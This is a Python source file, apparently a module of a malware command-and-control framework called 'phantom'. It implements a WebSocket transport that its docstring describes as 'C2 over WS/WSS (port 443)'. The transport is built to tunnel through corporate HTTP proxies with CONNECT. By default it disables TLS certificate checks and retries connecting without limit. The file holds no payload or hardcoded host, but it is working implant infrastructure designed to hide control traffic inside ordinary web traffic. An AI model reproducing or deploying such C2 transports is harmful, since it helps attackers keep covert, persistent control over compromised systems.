"""WebSocket tunneling transport — C2 over WS/WSS (port 443).

Implements RFC 6455 WebSocket protocol using only stdlib: TCP socket,
ssl module for TLS, manual HTTP Upgrade handshake, and frame encode/decode.
Passes through corporate HTTP proxies via the CONNECT method.
"""

import base64
import hashlib
import logging
import os
import random
import select
import socket
import ssl
import struct
import threading
import time
import urllib.parse

log = logging.getLogger("phantom.transport.websocket")

# RFC 6455 magic GUID for Sec-WebSocket-Accept validation
_WS_GUID = "258EAFA5-E914-47DA-95CA-5AB5DC65FE14"

# WebSocket opcodes
_OP_CONTINUATION = 0x0
_OP_TEXT = 0x1
_OP_BINARY = 0x2
_OP_CLOSE = 0x8
_OP_PING = 0x9
_OP_PONG = 0xA


def _generate_masking_key() -> bytes:
    return os.urandom(4)


def _mask_payload(key: bytes, data: bytes) -> bytes:
    """XOR mask/unmask per RFC 6455 section 5.3."""
    return bytes(b ^ key[i % 4] for i, b in enumerate(data))


class WebSocketTransport:
    """C2 transport over WebSocket (RFC 6455).

    Connects via ws:// or wss://, optionally through an HTTP proxy using
    the CONNECT method.  All client-to-server frames are masked per spec.

    Frame layout (RFC 6455 section 5.2):
      Byte 0:  FIN(1) | RSV1-3(3) | Opcode(4)
      Byte 1:  MASK(1) | Payload length(7)
      Extended length: 2 or 8 bytes if payload length is 126 or 127
      Masking key: 4 bytes (present when MASK bit set)
      Payload data: masked with key
    """

    def __init__(self, url: str, proxy_host: str | None = None,
                 proxy_port: int = 8080, headers: dict | None = None,
                 timeout: float = 30.0, retry_count: int = -1,
                 retry_delay: float = 10.0, ping_interval: float = 30.0,
                 verify_ssl: bool = False):
        parsed = urllib.parse.urlparse(url)
        self._use_tls = parsed.scheme in ("wss", "https")
        self._host = parsed.hostname or "localhost"
        self._port = parsed.port or (443 if self._use_tls else 80)
        self._path = parsed.path or "/"
        if parsed.query:
            self._path += f"?{parsed.query}"

        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.extra_headers = headers or {}
        self.timeout = timeout
        self.retry_count = retry_count
        self.retry_delay = retry_delay
        self.ping_interval = ping_interval
        self.verify_ssl = verify_ssl

        self._sock: socket.socket | None = None
        self._connected = False
        self._lock = threading.Lock()
        self._ping_thread: threading.Thread | None = None
        self._stop_ping = threading.Event()

    @property
    def connected(self) -> bool:
        return self._connected

    def _create_tcp_connection(self) -> socket.socket:
        """Establish TCP connection, optionally through HTTP proxy."""
        if self.proxy_host:
            return self._connect_via_proxy()

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self._host, self._port))
        return sock

    def _connect_via_proxy(self) -> socket.socket:
        """Tunnel through an HTTP proxy using the CONNECT method."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.proxy_host, self.proxy_port))

        connect_host = f"{self._host}:{self._port}"
        request = (
            f"CONNECT {connect_host} HTTP/1.1\r\n"
            f"Host: {connect_host}\r\n"
            f"Proxy-Connection: keep-alive\r\n"
            f"\r\n"
        )
        sock.sendall(request.encode())

        response = b""
        while b"\r\n\r\n" not in response:
            chunk = sock.recv(4096)
            if not chunk:
                sock.close()
                raise ConnectionError("Proxy closed connection during CONNECT")
            response += chunk

        status_line = response.split(b"\r\n")[0].decode()
        if "200" not in status_line:
            sock.close()
            raise ConnectionError(f"Proxy CONNECT failed: {status_line}")

        log.debug(f"Proxy tunnel established through {self.proxy_host}:{self.proxy_port}")
        return sock

    def _wrap_tls(self, sock: socket.socket) -> socket.socket:
        """Wrap TCP socket in TLS for wss:// connections."""
        ctx = ssl.create_default_context()
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(sock, server_hostname=self._host)

    def _do_handshake(self) -> bool:
        """Perform the WebSocket opening handshake (HTTP Upgrade).

        Client sends:
          GET /path HTTP/1.1
          Upgrade: websocket
          Connection: Upgrade
          Sec-WebSocket-Key: <base64 random 16 bytes>
          Sec-WebSocket-Version: 13

        Server must respond with:
          HTTP/1.1 101 Switching Protocols
          Sec-WebSocket-Accept: base64(SHA1(key + GUID))
        """
        ws_key = base64.b64encode(os.urandom(16)).decode()
        headers = {
            "Host": self._host if self._port in (80, 443) else f"{self._host}:{self._port}",
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Origin": f"{'https' if self._use_tls else 'http'}://{self._host}",
        }
        headers.update(self.extra_headers)

        request = f"GET {self._path} HTTP/1.1\r\n"
        for key, val in headers.items():
            request += f"{key}: {val}\r\n"
        request += "\r\n"

        self._sock.sendall(request.encode())

        # Read response headers
        response = b""
        while b"\r\n\r\n" not in response:
            chunk = self._sock.recv(4096)
            if not chunk:
                return False
            response += chunk

        response_str = response.decode(errors="replace")

        if "101" not in response_str.split("\r\n")[0]:
            log.error(f"WebSocket handshake rejected: {response_str.split(chr(13))[0]}")
            return False

        # Validate Sec-WebSocket-Accept
        expected_accept = base64.b64encode(
            hashlib.sha1((ws_key + _WS_GUID).encode()).digest()
        ).decode()

        for line in response_str.split("\r\n"):
            if line.lower().startswith("sec-websocket-accept:"):
                actual = line.split(":", 1)[1].strip()
                if actual != expected_accept:
                    log.error("Sec-WebSocket-Accept mismatch")
                    return False
                break

        return True

    def _encode_frame(self, data: bytes, opcode: int = _OP_BINARY,
                      fin: bool = True) -> bytes:
        """Encode a WebSocket frame with client-side masking.

        Frame format:
          [FIN|opcode] [MASK|len] [ext_len?] [mask_key] [masked_payload]
        """
        frame = bytearray()

        # First byte: FIN + opcode
        first_byte = (0x80 if fin else 0x00) | (opcode & 0x0F)
        frame.append(first_byte)

        # Second byte: MASK bit always set for client frames + payload length
        length = len(data)
        if length < 126:
            frame.append(0x80 | length)
        elif length < 65536:
            frame.append(0x80 | 126)
            frame.extend(struct.pack(">H", length))
        else:
            frame.append(0x80 | 127)
            frame.extend(struct.pack(">Q", length))

        # Masking key + masked payload
        mask_key = _generate_masking_key()
        frame.extend(mask_key)
        frame.extend(_mask_payload(mask_key, data))

        return bytes(frame)

    def _recv_exact(self, n: int) -> bytes | None:
        """Read exactly n bytes from the socket."""
        buf = bytearray()
        while len(buf) < n:
            try:
                chunk = self._sock.recv(n - len(buf))
            except (socket.timeout, OSError):
                return None
            if not chunk:
                return None
            buf.extend(chunk)
        return bytes(buf)

    def _decode_frame(self) -> tuple[int, bytes] | None:
        """Read and decode a single WebSocket frame from the socket.

        Returns (opcode, payload) or None on error.
        Server frames are typically unmasked.
        """
        header = self._recv_exact(2)
        if not header:
            return None

        fin = (header[0] >> 7) & 1
        opcode = header[0] & 0x0F
        masked = (header[1] >> 7) & 1
        length = header[1] & 0x7F

        if length == 126:
            ext = self._recv_exact(2)
            if not ext:
                return None
            length = struct.unpack(">H", ext)[0]
        elif length == 127:
            ext = self._recv_exact(8)
            if not ext:
                return None
            length = struct.unpack(">Q", ext)[0]

        mask_key = None
        if masked:
            mask_key = self._recv_exact(4)
            if not mask_key:
                return None

        if length > 10 * 1024 * 1024:
            log.error(f"WebSocket frame too large: {length}")
            return None

        payload = self._recv_exact(length) if length > 0 else b""
        if payload is None:
            return None

        if mask_key:
            payload = _mask_payload(mask_key, payload)

        return opcode, payload

    def _handle_control_frame(self, opcode: int, payload: bytes) -> bool:
        """Process WebSocket control frames (ping, pong, close).

        Returns False if the connection should be closed.
        """
        if opcode == _OP_PING:
            # Respond with pong containing the same payload
            pong = self._encode_frame(payload, opcode=_OP_PONG)
            with self._lock:
                try:
                    self._sock.sendall(pong)
                except OSError:
                    return False
            return True

        if opcode == _OP_PONG:
            return True

        if opcode == _OP_CLOSE:
            log.info("Received WebSocket close frame")
            # Echo close frame back
            close_frame = self._encode_frame(payload[:2] if len(payload) >= 2 else b"",
                                             opcode=_OP_CLOSE)
            with self._lock:
                try:
                    self._sock.sendall(close_frame)
                except OSError:
                    pass
            return False

        return True

    def _ping_loop(self):
        """Background thread: send periodic ping frames to keep alive."""
        while not self._stop_ping.wait(self.ping_interval):
            if not self._connected:
                break
            ping_data = struct.pack(">d", time.time())
            frame = self._encode_frame(ping_data, opcode=_OP_PING)
            with self._lock:
                try:
                    self._sock.sendall(frame)
                except OSError:
                    self._connected = False
                    break

    def connect(self) -> bool:
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            try:
                sock = self._create_tcp_connection()
                if self._use_tls:
                    sock = self._wrap_tls(sock)
                self._sock = sock

                if not self._do_handshake():
                    self._cleanup()
                    raise ConnectionError("WebSocket handshake failed")

                self._connected = True

                # Start ping keepalive thread
                self._stop_ping.clear()
                self._ping_thread = threading.Thread(target=self._ping_loop,
                                                     daemon=True)
                self._ping_thread.start()

                log.info(f"WebSocket connected to {self._host}:{self._port}")
                return True

            except Exception as e:
                log.warning(f"WebSocket connect failed (attempt {attempts + 1}): {e}")
                self._cleanup()

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                return False
            time.sleep(self.retry_delay)
        return False

    def send(self, data: bytes) -> bool:
        if not self._connected or not self._sock:
            return False
        frame = self._encode_frame(data, opcode=_OP_BINARY)
        with self._lock:
            try:
                self._sock.sendall(frame)
                return True
            except OSError as e:
                log.error(f"WebSocket send failed: {e}")
                self._connected = False
                return False

    def recv(self) -> bytes | None:
        if not self._connected or not self._sock:
            return None

        while True:
            result = self._decode_frame()
            if result is None:
                self._connected = False
                return None

            opcode, payload = result

            # Handle control frames transparently
            if opcode in (_OP_PING, _OP_PONG, _OP_CLOSE):
                if not self._handle_control_frame(opcode, payload):
                    self._connected = False
                    return None
                continue

            # Data frame (text or binary)
            if opcode in (_OP_TEXT, _OP_BINARY):
                return payload

            # Continuation frames — not expected in our simple protocol
            log.debug(f"Unexpected opcode: {opcode}")
            return payload

    def disconnect(self):
        # Send close frame with normal closure status (1000)
        if self._connected and self._sock:
            close_payload = struct.pack(">H", 1000)
            frame = self._encode_frame(close_payload, opcode=_OP_CLOSE)
            with self._lock:
                try:
                    self._sock.sendall(frame)
                except OSError:
                    pass

        self._stop_ping.set()
        self._cleanup()
        log.info("WebSocket transport disconnected")

    def _cleanup(self):
        self._connected = False
        self._stop_ping.set()
        if self._sock:
            try:
                self._sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
